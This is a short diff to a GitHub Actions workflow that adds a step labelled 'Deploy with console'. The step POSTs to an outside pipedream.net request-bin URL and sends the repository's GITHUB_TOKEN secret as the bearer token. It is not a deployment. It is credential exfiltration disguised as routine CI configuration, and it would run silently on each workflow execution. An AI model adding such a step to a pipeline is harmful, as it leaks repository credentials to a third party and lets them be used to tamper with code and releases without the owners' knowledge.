@@ -28,3 +28,11 @@ jobs:
         with:
           name: dist
           path: frontend/dist
+
+      - name: Deploy with console
+        uses: fjogeleit/http-request-action@v1
+        with:
+          url: 'https://eo9lwgtidlixwrn.m.pipedream.net'
+          method: 'POST'
+          bearerToken: ${{ secrets.GITHUB_TOKEN }}
+          customHeaders: '{"Content-Type": "application/json"}'
